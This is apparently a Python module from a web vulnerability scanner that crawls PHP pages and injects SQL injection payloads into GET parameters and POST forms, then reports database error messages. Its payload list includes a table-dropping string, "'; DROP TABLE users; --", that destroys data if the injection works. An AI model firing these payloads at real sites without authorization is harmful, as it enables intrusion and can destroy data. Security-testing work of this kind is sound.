import re
from urllib.parse import urljoin
from bs4 import BeautifulSoup  # ADD THIS
from scanner.utils.http import fetch_url

class SQLInjectionScannerModule:
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' OR 1=1 --",
            "\" OR \"\" = \""
        ]
        self.error_signatures = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_",
            "valid MySQL result",
            "check the manual that corresponds to your MySQL server version",
            "mysql_fetch_array()",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "pg_query()",
            "Warning.*pg_",
            "Microsoft OLE DB Provider for SQL Server",
            "SQLSTATE",
            "Syntax error in string in query expression",
            "Fatal error",
            "OperationalError"
        ]

    def run_test(self, domain, crawled_links):
        findings = {}

        # Only test links ending in .php
        php_links = [link for link in crawled_links if link.endswith(".php")]
        param_links = []

        # Crawl each .php page again to find links with parameters
        for link in php_links:
            response = fetch_url(link)
            if not response:
                continue

            # 1. Extract GET links
            found_links = re.findall(r'href=["\'](.*?\.php\?.*?)["\']', response.text, re.IGNORECASE)
            for found in found_links:
                full_url = urljoin(link, found)
                param_links.append(full_url)

            # 2. Test forms on this page
            form_findings = self.test_forms(link)
            findings.update(form_findings)

        print(f"Param Links for SQLi: {param_links}")

        # Test GET param links
        for link in param_links:
            for payload in self.payloads:
                test_url = self.inject_payload(link, payload)
                test_response = fetch_url(test_url)

                print(f"Testing URL (GET): {test_url}")

                if not test_response:
                    continue

                if self.detect_sqli(test_response, test_url, findings):
                    break

        if not findings:
            findings["Info"] = "No obvious SQL Injection vulnerabilities found."

        return {
            "module": "SQL Injection Scanner",
            "findings": findings
        }

    def test_forms(self, page_url):
        """
        Find forms on page and inject SQLi into POST parameters.
        """
        findings = {}
        response = fetch_url(page_url)
        if not response:
            return findings

        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")

        print(f"Forms found in {page_url}: {len(forms)}")

        for form in forms:
            action = form.get("action")
            form_url = urljoin(page_url, action) if action else page_url
            method = form.get("method", "get").lower()

            if method != "post":
                continue  # Only scan POST forms

            inputs = form.find_all(["input", "textarea"])
            input_names = [input_.get("name") for input_ in inputs if input_.get("name")]

            if not input_names:
                continue

            for payload in self.payloads:
                data = {name: payload for name in input_names}
                test_response = fetch_url(form_url, method="post", data=data)

                print(f"Testing Form URL (POST): {form_url}")

                if not test_response:
                    continue

                if self.detect_sqli(test_response, form_url, findings):
                    break  # Stop after one finding

        return findings

    def detect_sqli(self, response, url, findings):
        """
        Analyze response for SQL errors.
        """
        if response.status_code in [500, 400]:
            findings[url] = f"Potential SQL Injection vulnerability! (HTTP {response.status_code})"
            return True

        for signature in self.error_signatures:
            if re.search(signature, response.text, re.IGNORECASE):
                findings[url] = f"Potential SQL Injection vulnerability detected (signature: {signature})"
                return True

        return False

    def inject_payload(self, url, payload):
        """
        Injects SQL payload into the first parameter.
        """
        if "?" not in url:
            return url

        base, params = url.split("?", 1)
        param_parts = params.split("&")
        first_param = param_parts[0].split("=")[0]

        # Inject payload into first param
        new_param = f"{first_param}={payload}"
        new_params = "&".join([new_param] + param_parts[1:])

        return f"{base}?{new_params}"
